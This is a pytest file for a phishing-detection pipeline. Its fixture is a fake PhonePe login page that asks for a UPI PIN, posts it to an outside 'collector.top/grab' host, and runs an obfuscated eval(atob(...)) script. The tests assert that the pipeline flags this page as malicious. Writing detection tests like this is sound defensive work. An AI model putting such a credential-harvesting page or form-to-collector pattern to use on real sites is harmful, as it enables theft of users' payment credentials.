"""Pipeline-level test: an injected clone-like FetchResult yields visual_similarity + behaviour signals."""
from app.services import pipeline
from app.services.fetcher import FetchResult


CLONE_HTML = """
<html><head><title>PhonePe Secure UPI</title></head><body>
<p>Login to PhonePe and enter your UPI PIN to make a secure payment via UPI wallet.</p>
<form action="https://collector.top/grab" method="post">
  <input name="upi_pin" type="password">
</form>
<script>eval(atob("eA=="));</script>
</body></html>
"""


def test_pipeline_sets_visual_similarity_and_behaviour_signals():
    result = FetchResult(
        url="http://ph0nepe-kyc.xyz/login", final_url="http://ph0nepe-kyc.xyz/login",
        redirect_chain=["http://ph0nepe-kyc.xyz/login"], status=200, html=CLONE_HTML, ok=True,
        favicon_hash="abc123def4567890",
        forms=[{"action": "https://collector.top/grab", "method": "post",
                "inputs": [{"name": "upi_pin", "type": "password"}]}],
    )
    cand = pipeline.analyze_url("http://ph0nepe-kyc.xyz/login", source="user_report",
                                fetch_result=result)

    assert cand.visual_similarity is not None and cand.visual_similarity > 0
    names = {s.name for s in cand.signals}
    assert "credential_input_fields" in names
    assert "cross_domain_form_action" in names
    assert 0.0 <= cand.risk_score <= 1.0
    assert cand.verdict == "malicious"
    # favicon_hash entity added for clustering.
    assert any(e.type == "favicon_hash" and e.value == "abc123def4567890" for e in cand.entities)


def test_pipeline_without_fetch_leaves_visual_none():
    cand = pipeline.analyze_url("http://ph0nepe-kyc-verify.xyz/login", source="user_report")
    assert cand.visual_similarity is None
    assert 0.0 <= cand.risk_score <= 1.0
